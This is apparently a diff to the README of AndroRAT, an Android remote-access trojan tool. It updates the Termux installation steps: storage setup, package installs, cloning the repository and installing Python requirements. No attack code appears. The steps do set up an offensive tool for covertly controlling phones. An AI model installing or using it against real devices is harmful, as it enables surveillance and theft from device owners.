@@ -30,12 +30,15 @@ AndroRAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
+termux-setup-storage
 pkg update && pkg upgrade
 pkg install openjdk-17
-apt-get install zipalign
+pkg install zipalign
 pkg install aapt
+pkg install git
 git clone https://github.com/karma9874/AndroRAT.git
 cd AndroRAT
+pip install colorama
 pip install -r requirements.txt
 ```
 #### Note: 
